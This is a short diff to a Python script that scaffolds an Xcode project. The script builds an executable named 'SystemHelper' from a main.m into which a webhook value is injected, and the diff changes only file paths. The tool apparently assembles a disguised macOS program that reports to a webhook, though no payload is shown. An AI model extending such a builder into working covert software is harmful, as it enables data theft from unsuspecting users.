@@ -192,8 +192,8 @@ PBXPROJ = '''// !$*UTF8*$!
     objectVersion = 56;
     objects = {{
         AAAA0001 = {{isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.executable"; path = SystemHelper; sourceTree = BUILT_PRODUCTS_DIR; }};
-        AAAA0002 = {{isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; }};
-        AAAA0003 = {{isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; }};
+        AAAA0002 = {{isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = SOURCE_ROOT; }};
+        AAAA0003 = {{isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = SOURCE_ROOT; }};
 
         AAAA0004 = {{isa = PBXBuildFile; fileRef = AAAA0002; }};
 
@@ -259,8 +259,8 @@ def scaffold():
     (proj / "xcshareddata").mkdir(parents=True, exist_ok=True)
 
     main_m = MAIN_M.replace("__WEBHOOK__", WEBHOOK)
-    (SRC_DIR / "main.m").write_text(main_m)
-    (SRC_DIR / "Info.plist").write_text(INFO_PLIST.format(BUNDLE_ID=BUNDLE_ID, APP_NAME=APP_NAME))
+    (BUILD_DIR / "main.m").write_text(main_m)
+    (BUILD_DIR / "Info.plist").write_text(INFO_PLIST.format(BUNDLE_ID=BUNDLE_ID, APP_NAME=APP_NAME))
     (proj / "project.pbxproj").write_text(PBXPROJ.format(BUNDLE_ID=BUNDLE_ID))
     print(f"[+] scaffolded {proj}")
 
@@ -309,3 +309,4 @@ def main():
             if t.exists(): shutil.rmtree(t)
 
 if __name__ == "__main__": main()
+
